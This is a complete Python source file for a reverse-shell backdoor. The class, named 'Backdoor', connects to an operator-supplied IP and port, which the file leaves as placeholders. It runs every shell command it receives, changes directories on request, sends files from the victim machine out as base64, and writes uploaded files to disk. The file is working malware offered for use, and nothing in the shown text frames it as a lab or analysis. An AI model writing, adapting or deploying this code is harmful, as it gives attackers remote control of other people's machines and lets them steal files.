#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
class Backdoor: 
    def __init__(self, ip, port): 
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.reliable_send("\n[+] Connection Established. \n")  # Send as string

    def reliable_send(self, data):
        json_data = json.dumps(data)
        json_data_bytes = json_data.encode('utf-8')
        # Send length of the data first
        length = len(json_data_bytes)
        self.connection.send(length.to_bytes(4, 'big'))
        self.connection.send(json_data_bytes)

    def reliable_recv(self):
        # Receive the length of the data
        length_bytes = self.connection.recv(4)
        if not length_bytes:
            return None
        length = int.from_bytes(length_bytes, 'big')
        # Receive the data
        json_data_bytes = b''
        while len(json_data_bytes) < length:
            chunk = self.connection.recv(length - len(json_data_bytes))
            if not chunk:
                break
            json_data_bytes += chunk
        json_data = json_data_bytes.decode('utf-8', errors='ignore')
        return json.loads(json_data)

    def change_dir(self, path):
        os.chdir(path)
        return "[+] Changing Directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file: 
            return base64.b64encode(file.read()).decode('utf-8')

    def write_file(self, path, content):
        with open(path, "wb") as file: 
            file.write(base64.b64decode(content))
            return "[+] Upload Successful."


    def execute_system_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode('utf-8', errors='ignore')
        except subprocess.CalledProcessError as e:
            return e.output.decode('utf-8', errors='ignore')

    def run(self):
        while True: 
            command = self.reliable_recv()
            try:
                if command is None: 
                    break
                elif command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_dir(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else: 
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution" 

            self.reliable_send(command_result)
        

my_backdoor = Backdoor([IP], [PORT])
my_backdoor.run()
